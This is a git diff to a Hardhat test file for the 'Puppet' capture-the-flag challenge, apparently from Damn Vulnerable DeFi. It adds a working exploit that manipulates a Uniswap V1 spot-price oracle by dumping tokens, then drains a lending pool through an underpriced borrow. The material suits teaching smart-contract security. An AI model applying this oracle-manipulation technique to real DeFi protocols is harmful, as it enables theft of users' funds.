@@ -3,6 +3,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const { BigNumber } = require("ethers");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -102,8 +103,33 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        let blockNumber = await ethers.provider.getBlockNumber();
+        let deadline = (await ethers.provider.getBlock(blockNumber)).timestamp + 1800;
+        let exchange = this.uniswapExchange.connect(attacker);
+        let lpool = this.lendingPool.connect(attacker);
+
+        // uniswap 10 ETH 10 DVT, pool deposit required 200000, attacker 25 ETH 1000 DVT
+
+        let initialTokenBalance = await this.token.balanceOf(attacker.address);
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, initialTokenBalance);
+        await exchange.tokenToEthTransferInput(initialTokenBalance, 1, deadline, attacker.address);
+
+        // uniswap ~0 ETH 1010 DVT, pool deposit required ~20, attacker ~35 ETH 0 DVT
+
+        let deposit = await lpool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        await lpool.borrow(POOL_INITIAL_TOKEN_BALANCE, { gasLimit: 1e6, value: deposit });
+        
+        // uniswap ~0 ETH 1010 DVT, pool deposit required ~20, attacker ~35 ETH 100000 DVT
+
+        await exchange.ethToTokenTransferInput(
+            1, deadline, attacker.address, { gasLimit: 1e6, value: UNISWAP_INITIAL_ETH_RESERVE }
+        );
+
+        // uniswap ~10 ETH ~10 DVT, pool deposit required ~200000, attacker ~5 ETH ~101000 DVT
     });
+
+    
 
     after(async function () {
         /** SUCCESS CONDITIONS */
